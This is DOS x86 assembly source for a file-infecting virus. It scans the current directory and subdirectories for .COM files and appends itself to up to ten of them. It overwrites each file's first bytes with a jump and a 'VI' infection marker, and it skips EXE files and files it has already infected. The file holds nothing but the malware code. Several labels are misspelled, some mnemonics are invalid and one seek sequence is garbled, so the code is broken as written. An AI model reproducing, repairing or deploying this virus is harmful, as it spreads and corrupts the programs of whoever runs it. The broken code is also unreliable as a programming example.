.model tiny
.code
	ORG 100H

HOST:
	jmp NEAR PTR VIRUS_START
	db 'VI'
	db 100H dup (90H)
	mov ax,4C00H
	int 21H
VIRUS:
	
ALLFILE DB '*.*',0

START_IMAGE DB 0,0,0,0,0
VIRUS_START:
	call GET_START
GET_START:
	pop di
	sub di,OFFSET GET_START
	call INFECT_FILES
EXIT_VIRUS:
	mov ah,1AH
	mov dx,80H
	mov si,OFFSET HOST
	add di,OFFSET START_CODE
	push si
	xchg si,di
	movsw
	movsw
	movsb
	ret
START_CODE:
	nop
	nop
	nop
	nop
	nop
INT_CNT DB ?
DEPTH DB ?
PATH DB 10 dup(0)

INFECT_FILE
	mov [di+INF_CNT],10
	mov [di+DEPTH],1
	call SEARCH_DIR
	cmp [di+INF_CNT],0
	jz IFDONE
	mov ah,47H
	xor dl,dl
	lea si,[di+CUR_DIR+1]
	int 21H
	mov [di+DEPTH],2
	mov ax,'\'
	mov WoRD PTR [di+PATH],ax

	mov ah,3BH
	mov dx,[di+PATH]
	int 21H
	call SEARCH_DIR
	mov ah,3BH
	lea dx,[di+CUR_DIR]
	int 21H
IFDOE: ret

PRE_DIR DB '..',0
CUR_DIR DB '\'
		DB 65 dup (0)

SEARCH_DIR:
	push bp
	sub sp,43H
	mov bp,sp
	mov dx,bp
	mov ah,1AH
	lea dx,[di+OFFSET ALLFILE]
	mov cx,3FH
	mov ah,4EH
SDLP: int 21H
	jc SDDONE
	mov al,[bp+15H]
	and al,10H
	jnz SD1
	call FILE_OK
	jc SD2
	call INFECT
	dec [di+INFECT]
	cmp [di+INFECT],0
	jz SDDONE
	jmp SD2
SD1:cmp [di+DEPTH],0
	jz SD2
	cmp BYTE PTR [bp+1EH]
	jz SD2
	dec [di+DEPTH]
	lea dx,[bp+1EH]
	mov ah,3BH
	int 21H
	jc SD2
	call SEARCH_DIR
	lea dx,[di+PRE_DIR]
	mov ah,3BH
	int 21H
	inc [di+DEPTH]
	cmp [di+INF_CNT],0
	jz SDDONE
	mov dx,bp
	mov ah,1AH
	int 21H
SD2: mov ah,4FH
	jmp SDLP
SDDONE: add sp,43H
	pop bp
	ret
FILE_OK:
	lea si,[bp+1EH]
	mov dx,si
FO1: loadsb
	cmp al,'.'
	je FO2
	cmp al,0
	jne FO1
	jmp FOKCEND
FO2:loadsw
	cmp ax,'OC'
	jne FOKCEND
	loadsb
	cmp l,'M'
	jne FOKCEND

	mov ax,3D02H
	int 21H
	jc FOK_END
	mov bx,ax
	mov cx,5
	lea dx,[di+START_IMAGE]
	mov ah,3FH
	int 21H
	pushf
	mov ah,3EH
	int 21H
	popf
	jc FOK_END

	mov ax,[bp+1AH]
	add ax,OFFSET ENDVIR-OFFSET VIRUS + 100H
	jc FOK_END
	cmp WORD PTR [di+START_IMAGE],'ZM'
	je FOKCEND
	cmp BYTE PTR [di+START_IMAGE],0E9H
	jnz FOK_NCEND
	cmp WORD PTR [di+START_IMAGE+3],'IV'
	jnz FOK_NCEND
FOKCEND:stc
FOK_END:ret
FOK_NCEND:
	clc
	ret
INFECT:
	lea dx,[bp+1EH]
	mov ax,3D02H
	int 21H
	mov bx,ax
	xor cx,cx
	mov dx,cx
	mov ax,4202H
	int 21H
	mov cx, OFFSET ENDVIR - OFFSET VIRUS
	lea dx,[di+VIRUS]
	mov ah,40H
	int 21H
	xor cx,cx
	mov dx,[bp+1AH]
	add dx,OFFSET START_CODE - OFFSET VIRUS
	mov ax,4200H
	mov cx,5
	lea dx,[di+START_IMAGE]
	mov ah,40H
	int 21H
	xor cx,cx
	mov dx,cx
	mov ax,4200H
	int 21H
	
	mov BYTE PTR [di+START_IMAGE],0E9H
	mov ax,[bp+1AH]
	add ax,OFFSET VIRUS_START-OFFSET VIRUS-3
	mov WORD PTR [di+START_IMAGE+1],ax
	mov WORD PTR [di+START_IMAGE+3],4956H
	mov cx,5
	lea dx,[di+START_IMAGE]
	mov ah,40H
	int 21H
	mov ah,3EH
	int 21H
	ret

ENDVIR:
	END HOST




